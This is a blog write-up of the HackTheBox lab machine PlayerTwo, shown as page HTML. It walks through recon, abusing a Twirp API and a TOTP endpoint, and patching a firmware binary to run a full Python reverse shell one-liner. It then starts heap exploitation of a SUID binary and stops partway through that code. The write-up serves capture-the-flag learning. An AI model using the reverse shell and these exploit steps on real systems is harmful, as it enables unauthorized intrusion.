<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.22.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Write-up: HackTheBox - PlayerTwo - #keepLearning</title>
<meta name="description" content="One of those boxes where every step was very hard for me. It took me weeks and some nudges to complete but it taught me a lot!">


  <meta name="author" content="Philipp Menner">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="#keepLearning">
<meta property="og:title" content="Write-up: HackTheBox - PlayerTwo">
<meta property="og:url" content="http://localhost:4000/boxes/player2/">


  <meta property="og:description" content="One of those boxes where every step was very hard for me. It took me weeks and some nudges to complete but it taught me a lot!">







  <meta property="article:published_time" content="2020-06-26T21:33:36-04:00">





  

  


<link rel="canonical" href="http://localhost:4000/boxes/player2/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Philipp Menner",
      "url": "http://localhost:4000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="#keepLearning Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">
<!-- end custom head snippets -->

  </head>

  <body class="layout--single">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/88x88.png" alt=""></a>
        
        <a class="site-title" href="/">
          #keepLearning
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/about/">About</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Write-up: HackTheBox - PlayerTwo">
    <meta itemprop="description" content="One of those boxes where every step was very hard for me. It took me weeks and some nudges to complete but it taught me a lot!">
    <meta itemprop="datePublished" content="2020-06-26T21:33:36-04:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Write-up: HackTheBox - PlayerTwo
</h1>
          

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          25 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right sticky">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-cog"></i> Table of Contents</h4></header>
              <ul class="toc__menu">
  <li><a href="#overview">Overview</a></li>
  <li><a href="#recon">Recon</a>
    <ul>
      <li><a href="#twirp">Twirp</a></li>
      <li><a href="#creating-credentials">Creating credentials</a></li>
      <li><a href="#protobs-part-1">Protobs Part 1</a></li>
    </ul>
  </li>
  <li><a href="#root-part-intended-way">Root Part (intended way)</a>
    <ul>
      <li><a href="#playing-the-game-protobs-part-2">Playing the game, Protobs part 2</a>
        <ul>
          <li><a href="#leaking-libc">Leaking libc</a></li>
          <li><a href="#null-byte-overwrite-vulnerability">Null byte overwrite vulnerability</a></li>
          <li><a href="#aligning-game-descriptions-adjacent">Aligning game descriptions adjacent</a></li>
          <li><a href="#the-double-free">The double free</a></li>
          <li><a href="#tcache-poisoning">Tcache poisoning</a></li>
        </ul>
      </li>
      <li><a href="#complete-script">Complete Script</a></li>
    </ul>
  </li>
  <li><a href="#appendix">Appendix</a>
    <ul>
      <li><a href="#root---unintended">Root - unintended</a></li>
      <li><a href="#root---another-intended-way">Root - another intended way</a></li>
    </ul>
  </li>
  <li><a href="#references">References</a></li>
</ul>

            </nav>
          </aside>
        
        <h1 id="overview">Overview</h1>
<p class="text-justify"><a href="https://app.hackthebox.eu/machines/PlayerTwo">PlayerTwo</a> is MrR3boot’s follow-up box to his box <em>Player</em> - this time created in collaboration with b14ckh34rt.
It requires quite a bit of fuzzing and research on twirp to start the box, a little bit of binary exploitation for user and and even more so to get root without cheat codes.</p>

<h1 id="recon">Recon</h1>
<p>A <code class="language-plaintext highlighter-rouge">nmap -p- 10.10.10.170</code> reveals an interesting port 8545 besides the usual ssh and http ports.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8545/tcp open  unknown
</code></pre></div></div>
<p class="text-justify">Going to http://10.10.10.170 shows an error message giving away the hostname thus we add ‘player2.htb’ to /etc/hosts and we can now browse to http://player2.htb.
Besides explaining what went wrong on the predecessor box player it showcases why the new product is much better. It mentions a <em>protobs protocol</em> and leads us to a subdomain at<code class="language-plaintext highlighter-rouge">http://product.player2.htb</code> revealing a login page after adding the subdomain to /etc/hosts also. After trying a few standard username/password combinations such as admin/admin and a SQLi test we move on.
Fuzzing in the background for subdirectories on domain and subdomain show the following (bit shortened) results, the underlined directories will be important later on:</p>
<figure class="">
  <img src="/assets/images/playerTwo/Gobuster.png" alt="this is a placeholder image" />
  
    <figcaption>
      <code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u player2.htb</code> and <br /> <code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u product.player2.htb</code> respectively.

    </figcaption>
  
</figure>

<h2 id="twirp">Twirp</h2>
<p class="text-justify">Browsing to <code class="language-plaintext highlighter-rouge">http://player2.htb:8545</code> gives away the service running on this port with the following response:</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"code"</span><span class="p">:</span><span class="s2">"bad_route"</span><span class="p">,</span><span class="nl">"msg"</span><span class="p">:</span><span class="s2">"no handler for path </span><span class="se">\"\/\"</span><span class="s2">"</span><span class="p">,</span><span class="nl">"meta"</span><span class="p">:{</span><span class="nl">"twirp_invalid_route"</span><span class="p">:</span><span class="s2">"GET </span><span class="se">\/</span><span class="s2">"</span><span class="p">}}</span><span class="w">
</span></code></pre></div></div>
<p class="text-justify">Twirp invalid route leads us to the <em>Twirp Wire Protocol</em> which we have to find the endpoint of. To find out what the structure looks like its documentation <a href="#[0]">[0]</a> comes in handy where it mentions a <em>.proto</em> file which we fuzz for in the /proto directory, using wfuzz this time (gobuster with the <code class="language-plaintext highlighter-rouge">-x proto</code> flag works, too):</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">--hc</span> 404 http://player2.htb/proto/FUZZ.proto

000036168:   200        18 L     46 W     266 Ch      <span class="s2">"generated"</span>                   
</code></pre></div></div>
<p class="text-justify">The just found <code class="language-plaintext highlighter-rouge">http://player2.htb/proto/generated.proto</code> file outlines the design of the service in use, which is basically identical to the structure of the example in the documentation <a href="#[0]">[0]</a>:</p>
<figure class="">
  <img src="/assets/images/playerTwo/Twirp.png" alt="this is a placeholder image" />
  
    <figcaption>
      A comparison between the Protobuf definition file of PlayerTwo and from the documentation of <em>twirp</em>.

    </figcaption>
  
</figure>

<p>So we can deduce from the file that the service in use is an auth service and furthermore on <a href="#0">[0]</a> the format of the endpoint is specified as</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /twirp/<span class="nt">&lt;package&gt;</span>.<span class="nt">&lt;Service&gt;</span>/<span class="nt">&lt;Method&gt;</span>
</code></pre></div></div>
<p>which translates to <code class="language-plaintext highlighter-rouge">/twirp/twirp.player2.auth.Auth/GenCreds</code> in our case and since the error message when browsing to this endpoint isn’t the same as before we know we progressed:</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"code"</span><span class="p">:</span><span class="s2">"bad_route"</span><span class="p">,</span><span class="nl">"msg"</span><span class="p">:</span><span class="s2">"unsupported method </span><span class="se">\"</span><span class="s2">GET</span><span class="se">\"</span><span class="s2"> (only POST is allowed)"</span><span class="p">,</span><span class="nl">"meta"</span><span class="p">:{</span><span class="nl">"twirp_invalid_route"</span><span class="p">:</span><span class="s2">"GET </span><span class="se">\/</span><span class="s2">twirp</span><span class="se">\/</span><span class="s2">twirp.player2.auth.Auth</span><span class="se">\/</span><span class="s2">GenCreds"</span><span class="p">}}</span><span class="w">
</span></code></pre></div></div>
<h2 id="creating-credentials">Creating credentials</h2>
<p>Reading the docs further we see how we can access the service using curl and running the following command a couple of times we get five different sets of creds:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--request</span> POST <span class="nt">--location</span> <span class="s2">"http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds"</span> <span class="nt">--header</span> <span class="s2">"Content-Type:application/json"</span> <span class="nt">--data</span> <span class="s1">'{"":6}'</span>
<span class="c"># From reading the docs I expected --data '{"count":number}' to work but it doesn't - not sure why</span>
</code></pre></div></div>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"0xdf"</span><span class="p">,</span><span class="nl">"pass"</span><span class="p">:</span><span class="s2">"XHq7_WJTA?QD_?E2"</span><span class="p">}</span><span class="w">
</span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"snowscan"</span><span class="p">,</span><span class="nl">"pass"</span><span class="p">:</span><span class="s2">"XHq7_WJTA?QD_?E2"</span><span class="p">}</span><span class="w">
</span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"mprox"</span><span class="p">,</span><span class="nl">"pass"</span><span class="p">:</span><span class="s2">"tR@dQnwnZEk95*6#"</span><span class="p">}</span><span class="w">
</span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"jkr"</span><span class="p">,</span><span class="nl">"pass"</span><span class="p">:</span><span class="s2">"Lp-+Q8umLW5*7qkc"</span><span class="p">}</span><span class="w">
</span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"0xdf"</span><span class="p">,</span><span class="nl">"pass"</span><span class="p">:</span><span class="s2">"ze+EKe-SGF^5uZQX"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p>Trying these creds on the login page found earlier we are greeted by a two factor authorization!</p>
<figure class="">
  <img src="/assets/images/playerTwo/2fa.png" alt="this is a placeholder image" />
  
    <figcaption>
      

    </figcaption>
  
</figure>

<p class="text-justify">As we probably have no chance of guessing the right pin and brute-froce is never an option on HTB, we fuzz again, this time <code class="language-plaintext highlighter-rouge">http://product.player2.htb/api</code>. And with using a suitable wordlist we finally find another endpoint:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt <span class="nt">-u</span> product.player2.htb/api

/totp <span class="o">(</span>Status: 200<span class="o">)</span>
</code></pre></div></div>
<p>So we catch the request with <em>burp</em> to grab the PHPSESSID cookie, change the request method to <em>POST</em>, switch to curl and are greeted by an “Invalid action” error. By adding an action</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST <span class="nt">--header</span> <span class="s2">"Cookie: PHPSESSID=l2frl7cqoro7ufdsqsvgttb6vm"</span> <span class="nt">-H</span> <span class="s2">"Content-Type:application/json"</span> <span class="nt">--location</span> <span class="s2">"http://product.player2.htb/api/totp"</span> <span class="nt">--data</span> <span class="s1">'{"action": "some_action"}'</span>
</code></pre></div></div>
<p>we advance to</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"error"</span><span class="p">:</span><span class="s2">"Missing parameters"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p class="text-justify">From this we have a couple of options. We can write a small script on that or just guess some actions. In my case I guessed the action to be a number and got the following:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST <span class="nt">--header</span> <span class="s2">"Cookie: PHPSESSID=l2frl7cqoro7ufdsqsvgttb6vm"</span> <span class="nt">-H</span> <span class="s2">"Content-Type:application/json"</span> <span class="nt">--location</span> <span class="s2">"http://product.player2.htb/api/totp"</span> <span class="nt">--data</span> <span class="s1">'{"action": 0}'</span>
</code></pre></div></div>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"user"</span><span class="p">:</span><span class="s2">"jkr"</span><span class="p">,</span><span class="nl">"code"</span><span class="p">:</span><span class="s2">"29389234823423"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p>as I was using jkr’s credentials and we are in.</p>

<h2 id="protobs-part-1">Protobs Part 1</h2>
<p class="text-justify">Exploring the web page we find the following section which links to a documentation of the <em>Protobs Firmware</em> which includes a link to the firmware itself, as well as a link to a file upload:</p>
<figure class="">
  <img src="/assets/images/playerTwo/ProtobsAccess.png" alt="this is a placeholder image" />
  
</figure>

<figure class="">
  <img src="/assets/images/playerTwo/Doc.png" alt="this is a placeholder image" />
  
</figure>

<figure class="">
  <img src="/assets/images/playerTwo/FileUpload.png" alt="this is a placeholder image" />
  
</figure>

<p>Unpacking the tar file gives us for the most part a binary called <em>Protobs.bin</em>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod</span> +x Protobs.bin 	<span class="c"># making it executable</span>
<span class="nv">$ </span>./Protobs.bin		<span class="c"># file doesn't run</span>
bash: ./Protobs.original: cannot execute binary file: Exec format error
<span class="nv">$ </span>file Protobs.bin	<span class="c"># Analysing</span>
Protobs.bin: data	<span class="c"># Can't make much of it</span>
<span class="nv">$ </span>binwalk Protobs.bin	<span class="c"># See if sth useful is in there</span>

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
64            0x40            ELF, 64-bit LSB executable, AMD x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>

<span class="nv">$ </span><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>Protobs.bin <span class="nv">of</span><span class="o">=</span>Protobs.removed <span class="nv">skip</span><span class="o">=</span>64 <span class="nv">bs</span><span class="o">=</span>1
17200+0 records <span class="k">in
</span>17200+0 records out
17200 bytes <span class="o">(</span>17 kB, 17 KiB<span class="o">)</span> copied, 0.0462733 s, 372 kB/s	<span class="c"># Removing the first 64 bytes</span>
<span class="nv">$ </span>file Protobs.removed 
Protobs.removed: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>82adae308a0023a272e626bbe83d97b2b9c630f6, <span class="k">for </span>GNU/Linux 3.2.0, not stripped

</code></pre></div></div>
<p class="text-justify">By removing the first 64 bytes the <code class="language-plaintext highlighter-rouge">file</code> command now recognizes the binary as an ELF 64-bit executable but also the code in <code class="language-plaintext highlighter-rouge">Ghidra</code> is now much more readable:</p>
<figure class="">
  <img src="/assets/images/playerTwo/Firmware.png" alt="this is a placeholder image" />
  
    <figcaption>
      The firmware reverse engineered in <em>Ghidra</em>. Every time the binary gets executed, the main function calls <em>wait_for_fkey</em> in which we see multiple system calls.

    </figcaption>
  
</figure>

<p class="text-justify">Following the path of execution when the binary is run we see multiple system calls inside the <em>wait_for_fkey</em> function. System calls are dangerous because they directly execute the argument on the system the binary is executed on, therefore, if we can run the binary on the remote machine and overwrite the system call to something that is useful for us as an attacker we win.
Quoting the sentence below the file upload, it says that the firmware is sign tested on whether it is signed and working as intended, so we have chance that it will be executed after uploading. The latter part is doable with a hexeditor and we have a couple of options on what to overwrite the argument with. A simple test to check if the binary is executed after uploading would be to put a <code class="language-plaintext highlighter-rouge">ping -c 4 your_ip</code> in there and listen to incoming packages with <em>tcpdump</em>.
To do this we need to load the original binary into <code class="language-plaintext highlighter-rouge">Ghidra</code> and search for the first system call within the <em>wait_for_fkey</em> function, identify the address <em>20e4</em> and search that address in a hex editor of choice we loaded the binary in. We then replace the original by the ASCII code of our payload:</p>
<figure class="">
  <img src="/assets/images/playerTwo/Hex.png" alt="this is a placeholder image" />
  
    <figcaption>
      Upper part: Original binary loaded in <em>Ghidra</em>. Marked red is the address of the argument string. Green is the argument string denoted in ASCII format. <br /> Middle: Original view in a hex editor. 73 in ASCII is equivalent to the character lower s. <br /> Lower: Overwritten argument. To write a p one has i.e. to replace the 73 by 70.

    </figcaption>
  
</figure>

<p class="text-justify">Setting up the listener and uploading the edited file results in the desired four ping packages thus we have code execution:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>tcpdump <span class="nt">-i</span> tun0
08:18:49.392816 IP p2 <span class="o">&gt;</span> 10.10.14.7: ICMP <span class="nb">echo </span>request, <span class="nb">id </span>34815, <span class="nb">seq </span>1, length 64
08:18:49.392859 IP 10.10.14.7 <span class="o">&gt;</span> p2: ICMP <span class="nb">echo </span>reply, <span class="nb">id </span>34815, <span class="nb">seq </span>1, length 64
<span class="o">[</span>snip]
08:18:52.385493 IP p2 <span class="o">&gt;</span> 10.10.14.7: ICMP <span class="nb">echo </span>request, <span class="nb">id </span>34815, <span class="nb">seq </span>4, length 64
08:18:52.385534 IP 10.10.14.7 <span class="o">&gt;</span> p2: ICMP <span class="nb">echo </span>reply, <span class="nb">id </span>34815, <span class="nb">seq </span>4, length 64
</code></pre></div></div>
<p>As we now can execute code on the remote machine we have again a couple of options:</p>
<ul>
  <li>writing reverse shell code in there</li>
  <li>upload a webshell via <em>wget</em> and probably a lot more</li>
</ul>

<p class="text-justify">I opted to go for the reverse shell code and after trying a few different options the python reverse shell code worked (yea it’s long and ugly but working is working):</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
</code></pre></div></div>
<p class="text-justify">and boom - we’ve got a shell on the box - but still no user flag :/ But we notice a MQTT service running on port 1883:</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 1234
<span class="go">listening on [any] 1234 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.170] 33464
</span><span class="gp">www-data@player2:/var/www/product/protobs$</span><span class="w"> </span><span class="nb">cat</span> /home/observer/user.txt
<span class="go">cat: /home/observer/user.txt: Permission denied
</span><span class="gp">www-data@player2:/var/www/product/protobs$</span><span class="w"> </span>ss <span class="nt">-tulpn</span>
<span class="go">Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port   
udp    UNCONN   0        0           127.0.0.53%lo:53            0.0.0.0:*      
tcp    LISTEN   0        80              127.0.0.1:3306          0.0.0.0:*      
tcp    LISTEN   0        128         127.0.0.53%lo:53            0.0.0.0:*      
tcp    LISTEN   0        128               0.0.0.0:22            0.0.0.0:*      
tcp    LISTEN   0        100             127.0.0.1:1883          0.0.0.0:*      
tcp    LISTEN   0        128               0.0.0.0:8545          0.0.0.0:*      
tcp    LISTEN   0        128                     *:80                  *:*      
tcp    LISTEN   0        128                  [::]:22               [::]:*  
</span></code></pre></div></div>
<p class="text-justify">We can subscribe to all topics using <code class="language-plaintext highlighter-rouge">mosquitto_sub -t '$SYS/#'</code> and are disappointed because we don’t get any useful info. However keeping it running for some time we notice that every once in a while a SSH private key is broadcasted:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Retrieving the key from aws instance
Key retrieved..
<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA7Gc/OjpFFvefFrbuO64wF8sNMy+/7miymSZsEI+y4pQyEUBA
<span class="o">[</span>snip]
/1i6dn3iKSmL75aVKgQ5pJHkPYiTWTRq2a/y8g/leCrvPDM19KB5Zr0Z1tCw5XCz
iZHQGq04r9PMTAFTmaQfMzDy1Hfo8kZ/2y5+2+lC7wIlFMyYze8n8g<span class="o">==</span>
<span class="nt">-----END</span> RSA PRIVATE KEY-----
</code></pre></div></div>
<p class="text-justify">And for the first time we are lucky as the key is not password protected and we can connect right away to own user:</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-i</span> id_rsa observer@10.10.10.170
<span class="go">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.2.5-050205-generic x86_64)
[snip]
</span><span class="gp">observer@player2:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt 
<span class="go">CDE09**********************41251
</span></code></pre></div></div>

<h1 id="root-part-intended-way">Root Part (intended way)</h1>
<hr />
<p>Searching for SUID files shows an interesting file called Protobs:</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">observer@player2:~$</span><span class="w"> </span>find / <span class="nt">-perm</span> /4000 2&gt;/dev/null
<span class="go">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
[snip]
/usr/bin/pkexec
/usr/bin/at
/opt/Configuration_Utility/Protobs
[snip]
</span></code></pre></div></div>
<p>Looking into this directory we see that we get the helper library and libc used by Protobs:</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">observer@player2:~$</span><span class="w"> </span><span class="nb">ls</span> /opt/Configuration_Utility/
<span class="go">ld-2.29.so  libc.so.6  Protobs
</span></code></pre></div></div>
<p>Running the file shows the typical menu style for binary exploitation type of problems:</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">observer@player2:~$</span><span class="w"> </span>/opt/Configuration_Utility/Protobs 
<span class="go">
[*] Protobs: Service booting up.
[*] Protobs: Fetching configs...
  ___         _       _       
 | _ \_ _ ___| |_ ___| |__ ___
 |  _/ '_/ _ \  _/ _ \ '_ (_-&lt;
 |_| |_| \___/\__\___/_.__/__/
                              v1.0 Beta

</span><span class="gp">protobs@player2:~$</span><span class="w"> </span>0
<span class="go">
==Options=========
</span><span class="gp"> 1 -&gt;</span><span class="w"> </span>List Available Configurations
<span class="gp"> 2 -&gt;</span><span class="w"> </span>Create New Configuration
<span class="gp"> 3 -&gt;</span><span class="w"> </span>Read a Configuration
<span class="gp"> 4 -&gt;</span><span class="w"> </span>Delete a Configuration
<span class="gp"> 5 -&gt;</span><span class="w"> </span>Exit Service
<span class="go">==================
</span></code></pre></div></div>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>file Protobs 
<span class="go">Protobs: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/Configuration_Utility/ld-2.29.so, for GNU/Linux 3.2.0, BuildID[sha1]=53892814b4e50f2f75dd5fa98b077741917688a2, stripped

</span><span class="gp">$</span><span class="w"> </span>checksec Protobs
<span class="go">[\*] '/home/kali/HTB/boxes/player2/binary_2/Protobs'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'/opt/Configuration_Utility'

</span><span class="gp">observer@player2:~$</span><span class="w"> </span><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space <span class="c"># check if ASLR is enabled</span>
<span class="go">2
</span></code></pre></div></div>

<h2 id="playing-the-game-protobs-part-2">Playing the game, Protobs part 2</h2>
<p class="text-justify">In the following the exploitation of the binary via a double free will be presented. It is also possible to exploit the binary by coalesing two chunks, which is shown here <a href="#Appendix">[Appendix]</a>.</p>
<ul class="text-justify">
  <li>As ASLR is enabled on the machine we need to leak a libc address in order to get the libc base address from which we can calculate the addresses of the free hook and the system function.</li>
  <li>Looking at the reversed binary we notice a one byte overwrite vulnerability. Since that one byte overwrite will always be done with a null byte we cannot follow guides like <a href="#[1]">[1]</a> exactly but I recommend watching it as it shows the possibilities which arise by such a vulnerability and also covers tcache poisoning which we also will use.</li>
  <li>In order to overwrite data we need chunks that are <em>directly adjacent</em>. Since every chunk starts with the chunk size header (basically containing information about the size of the chunk and signalling whether the chunk is in-use with the LSB) that is the information we will be able to target. This also implies that overwriting chunk sizes smaller than 0x100 will result in a chunk size header which is the null byte. If we overwrite a header of size say 0x180 it’ll be 0x100. Because of the fact that every config we create will always start with a header of 0x41 for the <em>name</em> of the config (we can only choose the size for the <em>description</em>) we have to find a way around it to align to descriptions adjacent.</li>
  <li>Once we’ve overwritten the chunk size header appropriately we can double free it and perform a tcache poisoning as described in the writeup of the <em>zero_to_hero</em> challenge here <a href="#[1]">[1]</a>.
    <h3 id="leaking-libc">Leaking libc</h3>
    <p>In order to leak libc, writeups such as the babyheap defcon challenge <a href="#2">[2]</a> were really helpful to me for more details go there, I’ll sum it up:<br />
Each tcache can hold 7 same-size chunks when freed before it puts other freed chunks of this size into the unsorted bin. Thus we need to allocate and then free more than 7 chunks of same size, I went with size 0xf8. If we allocate and free 9 chunks we notice a chunk in the unsorted bin with its fd/bk pointer pointing into libc by running <code class="language-plaintext highlighter-rouge">heap bins</code>:</p>
  </li>
</ul>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>	<span class="c1"># add creates a config of size 0xf8, description content "A"*0x20
</span>    <span class="n">add</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>	<span class="c1"># and name of config is "" here
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>	
    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>		<span class="c1"># freeing the i-th config
</span></code></pre></div></div>
<figure class="">
  <img src="/assets/images/playerTwo/unsorted_bin.png" alt="this is a placeholder image" />
  
    <figcaption>
      The fd/bk pointer of the chunk in the unsorted bin points into the main arena of libc.

    </figcaption>
  
</figure>

<p class="text-justify">By clearing the tcache by allocating seven chunks of size 0xf8 and then allocating two empty configs we can leak this address. From the figure above we can also see that the libc base address is at 0x7effe6dab000 and our leaked address is 0x7effe6f8fca0. Since that difference is constant every time we run the binary and we can calculate the offset once (0x1e4ca0) and hardcode it.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>		<span class="c1"># clear tcache
</span>    <span class="n">add</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s">b"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
